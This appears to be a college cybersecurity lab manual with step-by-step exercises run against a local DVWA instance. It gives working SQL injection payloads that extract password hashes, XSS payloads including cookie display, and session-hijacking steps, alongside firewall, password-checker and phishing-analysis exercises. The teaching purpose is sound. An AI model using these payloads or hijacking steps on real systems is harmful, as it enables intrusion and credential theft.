# 🔐 Cybersecurity Lab Manual — Complete Step-by-Step Guide

> **Note:** All software is pre-installed on college lab systems unless stated otherwise.  
> This guide tells you **exactly where to click, what to type, and what to expect** — step by step, as if you have never done it before.

---

## 📋 Table of Contents

| # | Experiment | Lab |
|---|-----------|-----|
| 1 | [SQL Injection Attack on DVWA](#experiment-1-sql-injection-attack-on-dvwa) | Internal-1 |
| 2 | [Finding & Exploiting XSS Vulnerabilities (DVWA)](#experiment-2-finding--exploiting-xss-vulnerabilities) | Internal-1 |
| 3 | [Testing Authentication Weaknesses & Session Management](#experiment-3-testing-authentication-weaknesses-and-session-management) | Internal-1 |
| 4 | [Basic Firewall Configuration (Manual + Python)](#experiment-4-basic-firewall-configuration) | Internal-1 |
| 5 | [Password Strength Testing](#experiment-5-password-strength-testing) | Internal-1 |
| 6 | [Analyzing Phishing Emails](#experiment-6-analyzing-phishing-emails) | Internal-1 |
| 7 | [Packet Sniffing & Network Traffic Analysis](#experiment-7-packet-sniffing-and-network-traffic-analysis) | Internal-1 |
| 8 | [Analyzing Android App Permissions & Mobile Traffic](#experiment-8-analyzing-android-app-permissions-and-mobile-traffic) | Internal-2 |
| 9 | [Testing IoT Device Security](#experiment-9-testing-iot-device-security) | Internal-2 |
| 10 | [Creating & Analyzing Disk Images with Autopsy](#experiment-10-creating-and-analyzing-disk-images-with-autopsy) | Internal-2 |
| 11 | [Log File Analysis for Incident Detection](#experiment-11-log-file-analysis-for-incident-detection) | Internal-2 |
| 12 | [Network Forensics with Wireshark](#experiment-12-network-forensics-with-wireshark) | Internal-2 |
| 13 | [Privacy Audit of Apps & Data Breach Case Study](#experiment-13-privacy-audit-of-apps--data-breach-case-study) | Internal-2 |
| 14 | [Security Audit & Risk Assessment on Windows](#experiment-14-security-audit-and-risk-assessment-on-windows) | Internal-2 |

---

---

# Experiment 1: SQL Injection Attack on DVWA

**Aim:** To understand how SQL Injection vulnerabilities occur and how attackers exploit improper input validation to bypass authentication and extract database information.

**Platform:** Kali Linux | **Target:** DVWA (Damn Vulnerable Web Application)

---

## 🔷 How to Open Kali Linux Terminal

1. Look at the Kali Linux desktop.
2. **Right-click** anywhere on the empty desktop area.
3. Click **"Open Terminal Here"** from the menu that appears.
4. A black window with a blinking cursor opens — this is the Terminal. Everything you type here runs as a command.

---

## Step 1 — Start the Required Services

> DVWA needs Apache (a web server) and MySQL (a database) to be running first.

1. In the terminal, type the following command and press **Enter**:
   ```
   sudo service apache2 start
   ```
2. The terminal asks for a password — type `kali` and press **Enter**.
   *(Nothing appears while you type the password — that is normal.)*
3. When the prompt returns (a new line appears), type this and press **Enter**:
   ```
   sudo service mysql start
   ```
4. Again, type `kali` if asked for a password and press **Enter**.
5. Both services are now running. ✅

---

## Step 2 — Install DVWA (If Not Already Installed)

1. In the terminal, type and press **Enter**:
   ```
   sudo apt update
   ```
   *(This refreshes the list of available software. Wait for it to finish.)*
2. Then type and press **Enter**:
   ```
   sudo apt install dvwa -y
   ```
3. Wait for the installation to finish. You will see a lot of text scrolling — this is normal.

---

## Step 3 — Configure DVWA Database Password

1. In the terminal, type and press **Enter**:
   ```
   sudo nano /etc/dvwa/config.inc.php
   ```
2. A text editor opens inside the terminal (it shows the file content).
3. Find the line that says: `$_DVWA['db_password'] = 'something';`
4. Change whatever is inside the quotes to nothing (empty), so it looks like:
   ```
   $_DVWA['db_password'] = '';
   ```
5. Press `Ctrl + X` to start exiting.
6. It asks "Save modified buffer?" — press `Y`.
7. It shows the filename — press **Enter** to confirm.
8. You are back at the terminal prompt.

---

## Step 4 — Open DVWA in the Browser

1. Open **Firefox** browser in Kali Linux. (Click the Firefox icon in the taskbar at the bottom of the screen.)
2. In the **address bar** at the top, click it and type:
   ```
   http://127.0.0.1/dvwa
   ```
3. Press **Enter**.
4. A login page appears with DVWA logo.
5. In the **Username** field, type: `admin`
6. In the **Password** field, type: `password`
7. Click the **"Login"** button.
8. After logging in, you may see a setup page. Look for a button that says **"Create / Reset Database"** — click it.
9. The page refreshes and you are back at the login page — log in again with `admin` / `password`.

---

## Step 5 — Set Security Level to Low

1. In the left-side menu of DVWA, click **"DVWA Security"**.
2. You will see a dropdown menu that may show "Impossible" or "High".
3. Click the dropdown and select **"Low"**.
4. Click the **"Submit"** button.
5. A message says "Security level set to low". ✅

---

## Step 6 — Navigate to the SQL Injection Module

1. In the left-side menu, click **"SQL Injection"** (listed under Vulnerabilities).
2. A page appears with the title **"Vulnerability: SQL Injection"**.
3. You see a text box labelled **"User ID:"** and a **"Submit"** button.

---

## Step 7 — Test Normal Input First

1. In the **User ID** field, type: `1`
2. Click **"Submit"**.
3. The page shows:
   ```
   ID: 1
   First name: admin
   Surname: admin
   ```
4. This is normal — the database returned the user with ID 1.

---

## Step 8 — Authentication Bypass (Show All Users)

1. Clear the input field (click inside and press `Ctrl + A`, then `Delete`).
2. Type exactly:
   ```
   1' OR '1'='1
   ```
3. Click **"Submit"**.
4. **Result:** ALL user records in the database are displayed — admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith.
5. This confirms a SQL Injection vulnerability. ✅

> **Why this works:** The query becomes `SELECT ... WHERE id='1' OR '1'='1'` — since `'1'='1'` is always true, every row is returned.

---

## Step 9 — Find Number of Columns in the Table

> We need to know how many columns exist before using UNION attacks.

1. In the User ID field, type:
   ```
   1' ORDER BY 1-- -
   ```
2. Click Submit → page shows results normally.
3. Try:
   ```
   1' ORDER BY 2-- -
   ```
4. Click Submit → page still shows results.
5. Try:
   ```
   1' ORDER BY 3-- -
   ```
6. Click Submit → you may see an error (500 or "Unknown column in order clause").
7. **Conclusion:** The table has **2 columns** (last working ORDER BY was 2).

---

## Step 10 — UNION-Based Injection (Confirm Columns)

1. In the User ID field, type:
   ```
   1' UNION SELECT 1,2-- -
   ```
2. Click Submit.
3. Results appear — you can see "First name: 1, Surname: 2" in addition to normal results.
4. This confirms the table has 2 columns and both are injectable. ✅

---

## Step 11 — Extract the Database Name

1. In the User ID field, type:
   ```
   1' UNION SELECT database(),2-- -
   ```
2. Click Submit.
3. **Result:** You will see the database name — for DVWA it is **`dvwa`**.

---

## Step 12 — Extract Table Names

1. In the User ID field, type:
   ```
   1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
   ```
2. Click Submit.
3. **Result:** You see table names:
   - `guestbook`
   - `users`

---

## Step 13 — Extract Column Names from the Users Table

1. In the User ID field, type:
   ```
   1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
   ```
2. Click Submit.
3. **Result:** You see column names including `user`, `password`, `user_id`, `first_name`, `last_name`, etc.

---

## Step 14 — Extract Usernames and Passwords

1. In the User ID field, type:
   ```
   1' UNION SELECT user,password FROM users-- -
   ```
2. Click Submit.
3. **Result:** You see all usernames and their password hashes:
   ```
   admin : 5f4dcc3b5aa765d61d8327deb882cf99
   gordonb : e99a18c428cb38d5f260853678922e03
   1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
   ```
4. These are **MD5 hashes** — the password `5f4dcc3b5aa765d61d8327deb882cf99` decodes to `password`.

---

## 📊 SQL Injection — Quick Reference Table

| Step | What You Type | What Happens |
|------|--------------|--------------|
| Normal | `1` | Shows user with ID 1 |
| Auth Bypass | `1' OR '1'='1` | Shows ALL users |
| Count Columns | `1' ORDER BY 2-- -` | Works — 2 columns exist |
| UNION Test | `1' UNION SELECT 1,2-- -` | Confirms 2 injectable columns |
| Get DB Name | `1' UNION SELECT database(),2-- -` | Shows "dvwa" |
| Get Tables | `1' UNION SELECT table_name,2 FROM information_schema.tables...` | Shows "users", "guestbook" |
| Get Columns | `1' UNION SELECT column_name,2 FROM information_schema.columns...` | Shows column names |
| Get Passwords | `1' UNION SELECT user,password FROM users-- -` | Shows username + hashes |

---

## Prevention Techniques

- Use **Prepared Statements** (Parameterized Queries) — never concatenate user input into SQL.
- **Input Validation & Sanitization** — reject special characters like `'`, `--`, `UNION`.
- Use **Stored Procedures**.
- Deploy a **Web Application Firewall (WAF)**.
- Apply **Least Privilege** — database user should only have SELECT rights, not DROP.

## Result

SQL Injection attack was successfully performed on DVWA, demonstrating authentication bypass, data extraction, and the danger of unsanitized user input.

---

---

# Experiment 2: Finding & Exploiting XSS Vulnerabilities

**Aim:** To identify and exploit Cross-Site Scripting (XSS) vulnerabilities in DVWA using Kali Linux.

**Platform:** Kali Linux | **Target:** DVWA

---

## 🔷 Opening DVWA (Same as Experiment 1)

1. Open Terminal → start Apache and MySQL:
   ```
   sudo service apache2 start
   sudo service mysql start
   ```
2. Open Firefox → go to `http://localhost/dvwa`
3. Log in: `admin` / `password`
4. Go to **DVWA Security** → set level to **Low** → click **Submit**.

---

## Step 1 — Understanding XSS

XSS (Cross-Site Scripting) allows an attacker to **inject JavaScript code** into a web page. When other users visit that page, the malicious script runs in their browser.

**Three types in DVWA:**
| Type | How it works |
|------|-------------|
| **Reflected XSS** | Script is in the URL/request; runs once when the page loads |
| **Stored XSS** | Script is saved to the database; runs for every user who visits the page |
| **DOM-Based XSS** | Script modifies the page DOM client-side through URL fragments |

---

## Step 2 — Reflected XSS Test

1. In the DVWA left menu, click **"XSS (Reflected)"**.
2. The page shows: **"Vulnerability: Reflected Cross Site Scripting (XSS)"**
3. There is a text box asking: *"What's your name?"*
4. In that text box, type exactly:
   ```
   <script>alert('XSS')</script>
   ```
5. Click the **"Submit"** button.
6. **Result:** A popup alert box appears in the browser showing the text **"XSS"**. ✅
7. Click **"OK"** to close the popup.

> **Why this works:** The page reflects your input directly into the HTML without filtering. The browser sees a `<script>` tag and executes it.

---

## Step 3 — Reflected XSS with Custom Message

1. Clear the input box.
2. Type:
   ```
   <script>alert('Hello! Your session has been stolen!')</script>
   ```
3. Click Submit.
4. A popup appears with your custom message.
5. Notice the script text also appears in the URL bar — this URL can be sent to a victim.

---

## Step 4 — Stored XSS Test

1. In the DVWA left menu, click **"XSS (Stored)"**.
2. The page shows a **Guestbook form** with two fields: **Name** and **Message**.
3. In the **Name** field, type:
   ```
   <h1>Hacked</h1>
   ```
4. In the **Message** field, type:
   ```
   <script>alert('Stored XSS')</script>
   ```
5. Click **"Sign Guestbook"** button.
6. **Result 1:** The word **"Hacked"** appears in large heading text on the page.
7. **Result 2:** A popup alert showing **"Stored XSS"** appears. ✅
8. **Refresh the page** (press F5) — the popup appears AGAIN automatically.
9. This is because the script is now **permanently saved in the database** — every user who visits this page will see the popup.

> **Why this is dangerous:** An attacker could inject a script that silently steals cookies from every visitor and sends them to the attacker's server.

---

## Step 5 — DOM Based XSS

1. In the DVWA left menu, click **"XSS (DOM)"**.
2. The page shows a dropdown to **"Please choose a language"**.
3. Look at the **URL bar** at the top of the browser — it ends with something like `xss_d/`.
4. Click at the end of the URL in the address bar and add this text at the very end:
   ```
   #<script>alert('DOM XSS')</script>
   ```
   So the full URL looks like: `http://localhost/dvwa/vulnerabilities/xss_d/#<script>alert('DOM XSS')</script>`
5. Press **Enter**.
6. **Result:** A popup alert appears showing **"DOM XSS"**. ✅

---

## Step 6 — Cookie Stealing Demo (XSS + Session Theft)

1. Go back to **XSS (Stored)**.
2. In the **Message** field, type:
   ```
   <script>alert(document.cookie)</script>
   ```
3. Click **"Sign Guestbook"**.
4. **Result:** A popup appears showing the current session cookies, including `PHPSESSID` and `security=low`.
5. This demonstrates how an attacker could use XSS to **steal session cookies** and impersonate the logged-in user.

---

## Step 7 — Test How Security Levels Block XSS

1. Go to **DVWA Security** → change level to **"Medium"** → Submit.
2. Try the Reflected XSS payload: `<script>alert('XSS')</script>`
3. **Result:** The script tag is filtered — no popup. Medium level blocks `<script>` tags.
4. Now change level to **"High"** → Submit.
5. Try the same payload — still blocked.
6. Change back to **"Low"** when done.

---

## 📊 XSS — Summary Table

| XSS Type | Where to Go in DVWA | Payload Used | Expected Result |
|----------|-------------------|-------------|----------------|
| Reflected | XSS (Reflected) | `<script>alert('XSS')</script>` in Name box | Alert popup once |
| Stored | XSS (Stored) | Same in Message box | Alert every page load |
| DOM | XSS (DOM) | Add `#<script>alert('DOM')</script>` to URL | Alert popup |
| Cookie Steal | XSS (Stored) | `<script>alert(document.cookie)</script>` | Shows PHPSESSID |

---

## Prevention Techniques

- **Output Encoding** — convert `<` to `&lt;` before displaying user input in HTML.
- **Input Validation** — reject or sanitize HTML/JavaScript characters.
- **Content Security Policy (CSP)** — browser policy that blocks inline scripts.
- **HttpOnly Cookies** — prevents JavaScript from accessing session cookies.

## Result

XSS vulnerabilities (Reflected, Stored, DOM-based) were successfully identified and exploited in DVWA.

---

---

# Experiment 3: Testing Authentication Weaknesses and Session Management

**Aim:** To identify and analyze authentication weaknesses and session management vulnerabilities using DVWA in Kali Linux.

**Platform:** Kali Linux | **Target:** DVWA

---

## 🔷 Opening DVWA (Same startup as before)

1. Open Terminal → type:
   ```
   sudo service apache2 start
   sudo service mysql start
   ```
2. Open Firefox → go to `http://127.0.0.1/dvwa`
3. Log in: `admin` / `password`
4. Go to **DVWA Security** → set to **Low** → Submit.

---

## PART A — Authentication Weakness (Weak Password)

### Step 1 — Open the Brute Force Module

1. In the left-side DVWA menu, click **"Brute Force"**.
2. The page shows: **"Vulnerability: Brute Force"** with a **Login** form.
3. You see a **Username** field and **Password** field.

### Step 2 — Try the Default Credentials

1. In the **Username** field, type: `admin`
2. In the **Password** field, type: `password`
3. Click **"Login"**.
4. **Result:** You see the message **"Welcome to the password protected area admin"** with a photo. ✅
5. **Observation:** Successful login with weak, default credentials proves a weak authentication vulnerability.

---

## PART B — Manual Brute Force Attack

### Step 3 — Try Passwords One by One

> We will manually try common passwords to simulate a brute force attack.

**Attempt 1:**
1. Clear the password field.
2. Type: `admin` in the Password field. Click **Login**.
3. ❌ Result: "Username and/or password incorrect." — Failed. Try next.

**Attempt 2:**
1. Type: `123456` in the Password field. Click **Login**.
2. ❌ Result: Incorrect. — Failed. Try next.

**Attempt 3:**
1. Type: `password` in the Password field. Click **Login**.
2. ✅ **LOGIN SUCCESSFUL** — Welcome message appears.

### Step 4 — Observe What Happened

After 3 attempts:
- DVWA **did NOT block** you after wrong attempts.
- DVWA **did NOT lock the account** after failures.
- DVWA **allowed unlimited attempts** without any wait time.

> This is called **Brute Force Vulnerability** — a real attacker could try thousands of passwords automatically using tools like Hydra.

---

## PART C — Session Management Vulnerabilities

### Experiment A — Session ID Analysis

#### Step 5 — View the Session Cookie

1. While logged in to DVWA, **right-click** anywhere on the page.
2. A menu appears — click **"Inspect"** (or "Inspect Element").
3. The browser Developer Tools panel opens (usually at the bottom or right side).
4. Click the **"Storage"** tab at the top of the Developer Tools panel.
5. On the left side of the Storage panel, click **"Cookies"**.
6. Click on **"http://127.0.0.1"** under Cookies.
7. You see a row named **PHPSESSID** — this is the session identifier.

#### Step 6 — Note the Session ID Value

Look at the **Value** column next to PHPSESSID. It will be something like:
```
5f6194766020dcaa2c906358cbd2941b
```
Write this value down — you will use it in the next experiment.

**Observation:** The session ID is visible, stored in plain text, and has no encryption. ✅

---

### Experiment B — Session Hijacking

#### Step 7 — Copy the Session ID (Victim's Browser)

1. You are logged in as admin in Firefox (this is the **"Victim" browser**).
2. Follow Step 5–6 above to find the PHPSESSID value.
3. **Right-click** on the PHPSESSID value → click **"Copy"**.
   *(Or click the value, then press `Ctrl + A` to select all, then `Ctrl + C` to copy.)*

#### Step 8 — Open an Attacker Browser (Private Window)

1. In Firefox, press `Ctrl + Shift + P` on your keyboard.
2. A **Private Browsing window** opens (the window background is purple/dark).
3. In this Private window, **do NOT log in** — this simulates an attacker who does not know the password.
4. In the Private window address bar, type: `http://127.0.0.1/dvwa` and press Enter.
5. You see the DVWA login page.

#### Step 9 — Inject the Stolen Session ID

1. In the Private Window, **right-click** on the page → click **"Inspect"**.
2. Developer Tools opens → click **"Storage"** → click **"Cookies"** → click **"http://127.0.0.1"**.
3. You see the PHPSESSID row in the Private window.
4. **Double-click** on the PHPSESSID **Value** field.
5. It becomes editable — **delete the existing value** and **paste the copied PHPSESSID** (press `Ctrl + V`).
6. Press **Enter** to confirm.

#### Step 10 — Refresh and Observe

1. Press **F5** to refresh the page.
2. **Result:** The page now shows the DVWA home screen — you are **logged in as admin WITHOUT entering any username or password!** ✅

> **Conclusion:** This is **Session Hijacking** — an attacker who steals a session cookie can impersonate the victim completely.

---

### Experiment C — Session Fixation

#### Step 11 — Record Session ID BEFORE Login

1. Open a fresh Firefox window (not Private).
2. Go to: `http://127.0.0.1/dvwa` — you see the login page.
3. **Do NOT log in yet.**
4. Right-click → Inspect → Storage → Cookies → http://127.0.0.1
5. Note the PHPSESSID value **before logging in**:
   ```
   Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
   ```

#### Step 12 — Log In and Check PHPSESSID Again

1. In the same browser window, log in: `admin` / `password`.
2. After logging in, go back to: Inspect → Storage → Cookies → http://127.0.0.1
3. Look at the PHPSESSID value **after logging in**.
4. Compare the two values:

| Scenario | Before Login PHPSESSID | After Login PHPSESSID | Result |
|----------|----------------------|----------------------|--------|
| **DVWA LOW (Vulnerable)** | `5f6194766...` | `5f6194766...` — **same value!** | ❌ Session Fixation exists |
| **DVWA HIGH (Secure)** | `5f6194766...` | `be2d584526...` — **different value!** | ✅ Session regenerated on login |

> **Why this is dangerous (DVWA LOW case):** An attacker can plant a known session ID on the victim's browser before they log in. After the victim logs in, the attacker already knows the session ID and can use it.

---

### Experiment D — Testing Session Persistence After Logout

#### Step 13 — Copy Session ID, Then Logout

1. While logged in to DVWA, copy the PHPSESSID value (Inspect → Storage → Cookies).
2. Write it down.
3. Click **"Logout"** in the DVWA menu.
4. You are taken back to the login page.

#### Step 14 — Try to Reuse the Old Session ID

1. Press `Ctrl + Shift + P` to open a Private Window.
2. Go to: `http://127.0.0.1/dvwa`
3. Inspect → Storage → Cookies → Paste the old PHPSESSID value.
4. Now go to: `http://127.0.0.1/dvwa/index.php` (type this URL and press Enter).
5. **Result (DVWA LOW):** ✅ You are logged in again, even though you logged out!
6. **Conclusion:** DVWA's logout does NOT destroy the server-side session — the old session ID still works.

---

## 📊 Observations & Results Summary

| Test Case | Result |
|-----------|--------|
| Weak Password Login | ✅ Successful with default password |
| Brute Force Attack | ✅ Allowed — no account lockout |
| Session ID Exposure | ✅ PHPSESSID visible in plain text |
| Session Hijacking | ✅ Possible by copying PHPSESSID |
| Session Fixation | ✅ Session ID does not change on login (LOW) |
| Improper Logout | ✅ Old session still valid after logout |

---

## Prevention Techniques

- **Account Lockout:** Lock accounts after 3–5 failed login attempts.
- **Strong Password Policy:** Minimum 8 characters with uppercase, numbers, symbols.
- **Session Regeneration:** Issue a new session ID after every successful login.
- **Secure Cookies:** Mark cookies as `HttpOnly` and `Secure`.
- **Session Expiry:** Invalidate sessions server-side on logout.
- **CAPTCHA:** Add CAPTCHA to prevent automated brute-force tools.

## VIVA Questions

1. What is authentication?
2. What is a brute force attack?
3. What is session hijacking?
4. What is session fixation?
5. How can session attacks be prevented?

---

---

# Experiment 4: Basic Firewall Configuration

**Aim:** To manually block a specific IP address using Windows Defender Firewall and to automate blocking of multiple malicious IPs using a Python script.

**Platform:** Windows OS | **Tools:** Windows Defender Firewall, Python, PowerShell

---

## PART A — Manual Firewall Configuration (GUI)

### Step 1 — Open Windows Defender Firewall with Advanced Security

1. Click the **Start button** (Windows logo at the bottom-left of the screen).
2. In the search bar that appears, type:
   ```
   Windows Defender Firewall with Advanced Security
   ```
3. You will see it appear in the search results — click on it.
4. A window opens with panels on the left, centre, and right. This is the Advanced Firewall configuration screen.
5. *(If it asks for administrator permission, click "Yes".)*

### Step 2 — Create a New Inbound Rule

1. On the **left panel**, click **"Inbound Rules"**.
2. The centre panel fills with a long list of existing rules.
3. On the **right panel**, look for **"New Rule..."** — click it.
4. A wizard window opens titled **"New Inbound Rule Wizard"**.

### Step 3 — Configure the Rule Type

1. You see options: Program / Port / Predefined / Custom.
2. Click the radio button next to **"Custom"**.
3. Click **"Next"** button (bottom-right of the wizard).

### Step 4 — Configure Programs

1. The next screen asks which programs this rule applies to.
2. Make sure **"All programs"** is selected.
3. Click **"Next"**.

### Step 5 — Configure Protocol and Ports

1. The next screen shows Protocol and Ports settings.
2. Leave everything at the **default values** — do not change anything.
3. Click **"Next"**.

### Step 6 — Set the IP Address to Block (Scope)

1. The next screen is titled **"Scope"**.
2. Under the section **"Which remote IP addresses does this rule apply to?"**:
   - Click the radio button next to **"These IP addresses"**.
3. Click the **"Add..."** button that appears.
4. A small dialog box opens.
5. In the text field, type an IP address you want to block. For example:
   ```
   1.2.3.4
   ```
6. Click **"OK"**.
7. You will see `1.2.3.4` now listed in the box.
8. Click **"Next"**.

### Step 7 — Set the Action to Block

1. The screen asks: **"What action should be taken?"**
2. Click the radio button next to **"Block the connection"**.
3. Click **"Next"**.

### Step 8 — Select Profiles

1. The screen asks which network profiles this rule applies to.
2. Make sure **all three checkboxes** are ticked: **Domain**, **Private**, **Public**.
3. Click **"Next"**.

### Step 9 — Name the Rule

1. In the **"Name"** field, type:
   ```
   Manual_Block_IP
   ```
2. In the Description field, optionally type: `Manually blocking a suspicious IP address`
3. Click **"Finish"**.
4. ✅ The rule is created. You can see **"Manual_Block_IP"** appear in the Inbound Rules list.
5. All incoming traffic from IP `1.2.3.4` is now blocked.

---

## PART B — Automated Firewall Configuration Using Python

### Problem Statement

Write a Python program that downloads a list of malicious IP addresses from a trusted online source and automatically creates firewall rules to block all of them.

### Step 10 — Open Command Prompt as Administrator

1. Click the **Start button**.
2. In the search bar, type: `cmd`
3. In the search results, you will see **"Command Prompt"**.
4. **Right-click** on it.
5. Click **"Run as administrator"** from the menu.
6. A prompt may appear asking "Do you want to allow this app to make changes?" — click **"Yes"**.
7. A black Command Prompt window opens. The window title should say **"Administrator: Command Prompt"**.

> ⚠️ This "Run as Administrator" step is **mandatory** — firewall rules cannot be created without admin rights.

### Step 11 — Navigate to Your Script Folder

1. In the Command Prompt, type (replace YourName with your actual Windows username):
   ```
   cd C:\Users\YourName\Desktop
   ```
2. Press **Enter**.
3. The prompt now shows you are in the Desktop folder.

### Step 12 — Check Python is Installed

1. Type and press **Enter**:
   ```
   python --version
   ```
2. It should show something like: `Python 3.11.0`
3. If it says "Python is not recognized", ask your lab instructor.

### Step 13 — Install the Required Library

1. Type and press **Enter**:
   ```
   python -m pip install requests
   ```
2. Wait for it to download and install.
3. When done, you see: `Successfully installed requests-X.X.X`

### Step 14 — Create the Python Script

1. Open **Visual Studio Code** or **Notepad**.
2. Create a new file and save it as `firewall.py` on the Desktop.
3. Type the following program exactly:

```python
import requests, csv, subprocess

# Download the malicious IP list from Abuse CH (a trusted cybersecurity source)
response = requests.get(
    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
).text

# First, delete any old "BadIP" rules so we start fresh
rule = 'netsh advfirewall firewall delete rule name="BadIP"'
subprocess.run(["PowerShell", "-Command", rule])

# Parse the CSV file (skip lines starting with #)
mycsv = csv.reader(
    filter(lambda x: not x.startswith("#"), response.splitlines())
)

# For each row in the CSV, extract the IP and create a blocking rule
for row in mycsv:
    ip = row[1]
    if ip != "dst_ip":  # Skip the header row
        print("Added Rule to block:", ip)
        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
        subprocess.run(["PowerShell", "-Command", rule])
```

4. Save the file: press `Ctrl + S`.

### Step 15 — Run the Python Script

1. Back in the **Administrator Command Prompt**, type:
   ```
   python firewall.py
   ```
2. Press **Enter**.
3. The script runs. For each IP address, you will see output like:
   ```
   Added Rule to block: 45.9.148.221
   Added Rule to block: 103.17.48.5
   Added Rule to block: 185.234.219.12
   ```
4. PowerShell also prints `OK` for each successful rule creation.
5. Wait for the script to finish (it may take a few minutes — there are many IPs).

### Step 16 — Verify the Rules Were Created

1. Open **Windows Defender Firewall with Advanced Security** again (see Step 1).
2. On the left panel, click **"Outbound Rules"**.
3. In the search/filter at the top-right (if available), look for rules named **"BadIP"**.
4. You should see many rows with the name "BadIP" — each blocking one malicious IP. ✅

---

## 📊 Summary Table

| Method | How | What Gets Blocked |
|--------|-----|------------------|
| Manual GUI | Windows Defender Firewall wizard | One specific IP (1.2.3.4) |
| Python Automation | Script + PowerShell + Abuse CH list | Hundreds of known malicious IPs |

## Result

Firewall rules were successfully created both manually through the Windows Defender GUI and automatically via a Python script that downloads and blocks malicious IPs from a threat intelligence feed.

---

---

# Experiment 5: Password Strength Testing

**Aim:** Write a Python program that accepts a password from the user and checks whether it is weak, medium, or strong based on security rules.

**Platform:** Windows or Kali Linux | **Tools:** Python 3, VS Code or any text editor

---

## Password Rules

| Rule | Requirement |
|------|------------|
| Length | Minimum 8 characters |
| Digit | At least one number (0-9) |
| Uppercase | At least one capital letter (A-Z) |
| Lowercase | At least one small letter (a-z) |
| Special Character | At least one symbol like `!@#$%^&*` |

---

## Step 1 — Open VS Code or Notepad

1. Click the **Start button** → type `VS Code` or `Notepad` → press **Enter**.
2. Open a new file.
3. Save it as `password_checker.py`.

## Step 2 — Type the Program

Copy/type this program into the file:

```python
import re

def check_password_strength(password):
    # Rule 1: Length check
    if len(password) < 8:
        return "Weak: Password must be at least 8 characters long."
    
    # Rule 2: Must have at least one digit
    if not any(char.isdigit() for char in password):
        return "Weak: Password must include at least one number."
    
    # Rule 3: Must have at least one uppercase letter
    if not any(char.isupper() for char in password):
        return "Weak: Password must include at least one uppercase letter."
    
    # Rule 4: Must have at least one lowercase letter
    if not any(char.islower() for char in password):
        return "Weak: Password must include at least one lowercase letter."
    
    # Rule 5: Must have at least one special character
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return "Medium: Add special characters to make your password stronger."
    
    # All rules passed!
    return "Strong: Your password is secure!"

def password_checker():
    print("Welcome to the Password Strength Checker!")
    while True:
        password = input("\nEnter your password (or type 'exit' to quit): ")
        
        if password.lower() == "exit":
            print("Thank you for using the Password Strength Checker! Goodbye!")
            break
        
        result = check_password_strength(password)
        print(result)

if __name__ == "__main__":
    password_checker()
```

## Step 3 — Save the File

1. Press `Ctrl + S`.
2. Make sure the file is saved as `password_checker.py`.

## Step 4 — Open Command Prompt (or Terminal)

**On Windows:**
1. Press `Win + R` → type `cmd` → press **Enter**.
2. Navigate to the folder where you saved the file:
   ```
   cd C:\Users\YourName\Desktop
   ```

**On Kali Linux:**
1. Press `Ctrl + Alt + T` to open terminal.
2. Navigate to the folder:
   ```
   cd ~/Desktop
   ```

## Step 5 — Run the Program

1. Type and press **Enter**:
   ```
   python password_checker.py
   ```
2. The program displays:
   ```
   Welcome to the Password Strength Checker!
   
   Enter your password (or type 'exit' to quit):
   ```
3. Type a password and press **Enter** — the result is shown instantly.

## Step 6 — Test with Different Passwords

Try these test cases one by one:

| Password Entered | Expected Output |
|-----------------|----------------|
| `abc` | Weak: at least 8 characters |
| `abc123` | Weak: at least 8 characters |
| `Abcdef12` | Medium: Add special characters |
| `Abc@1234` | Strong: Your password is secure! |
| `ALLCAPS1!` | Weak: Must include lowercase |
| `alllower1!` | Weak: Must include uppercase |

## Step 7 — Exit the Program

1. When done testing, type `exit` and press **Enter**.
2. The program shows "Goodbye!" and ends.

---

## How the Code Works (Explanation)

| Function/Code | What it Does |
|--------------|-------------|
| `len(password) < 8` | Checks if password has fewer than 8 characters |
| `any(char.isdigit() for char in password)` | Checks if at least one character is a digit |
| `any(char.isupper() for char in password)` | Checks for at least one uppercase letter |
| `any(char.islower() for char in password)` | Checks for at least one lowercase letter |
| `re.search(r'[!@#...]', password)` | Uses regex to look for special characters |
| `while True:` | Keeps asking for passwords until user types 'exit' |

## Result

Python program successfully evaluates passwords and classifies them as Weak, Medium, or Strong based on security rules.

---

---

# Experiment 6: Analyzing Phishing Emails

**Aim:** To analyze a suspicious email using EML Analyzer and VirusTotal and identify whether it is phishing based on technical indicators.

**Tools:** Online EML Analyzer, VirusTotal, Sample `.eml` file

---

## 🔷 What is a Phishing Email?

A phishing email is a **fake email disguised to look legitimate** (like it came from your bank, Google, or a support team). The goal is to trick you into clicking a malicious link or giving up your password.

---

## PART A — Analyze the Email with EML Analyzer

### Step 1 — Obtain the Sample Email File

The sample file used in this experiment is:
```
2020-05-05-phishing-email-example-01.eml
```
*(This file is provided by your lab instructor or can be found at malware-traffic-analysis.net)*

### Step 2 — Open EML Analyzer Website

1. Open any web browser (Chrome, Firefox).
2. In the address bar, type:
   ```
   https://eml-analyzer.herokuapp.com
   ```
   OR search Google for **"EML Analyzer online"** and click the first result.
3. Press **Enter** — the EML Analyzer website loads.

### Step 3 — Upload the Email File

1. On the EML Analyzer page, look for a **"Choose File"** or **"Upload"** button.
2. Click it.
3. A file browser opens — navigate to where the `.eml` file is saved.
4. Click on the file **`2020-05-05-phishing-email-example-01.eml`**.
5. Click **"Open"**.
6. Click the **"Analyze"** or **"Submit"** button on the website.
7. Wait a few seconds — the analysis results appear.

### Step 4 — Read the EML Analyzer Results

Look at and note down the following from the results page:

| Field | Value Found |
|-------|------------|
| **Subject** | Warning: Final Notice |
| **From (Display Name)** | malware-traffic-analysis.net Support |
| **From (Actual Email)** | sues@nnwifi.com |
| **To** | brad@malware-traffic-analysis.net |
| **Content Type** | text/html |
| **Message-ID** | Missing ❌ (Suspicious!) |

**Header Analysis:**
| Field | Value |
|-------|-------|
| Sender IP | 94.100.31.27 |
| Reverse DNS | 94-100-31-27.static.hvvc.us |
| Mail Server | mail.nnwifi.com |

**Authentication Results:**
| Check | Result |
|-------|--------|
| SPF | ❌ FAILED |
| DKIM | ❌ Not signed |
| DMARC | ❌ Not aligned |

**Why SPF Fail is suspicious:** SPF (Sender Policy Framework) verifies that the sending server is authorized to send email for that domain. A failure means the email did NOT come from an authorized server — strong indicator of spoofing.

---

## PART B — Analyze the Sender IP with VirusTotal

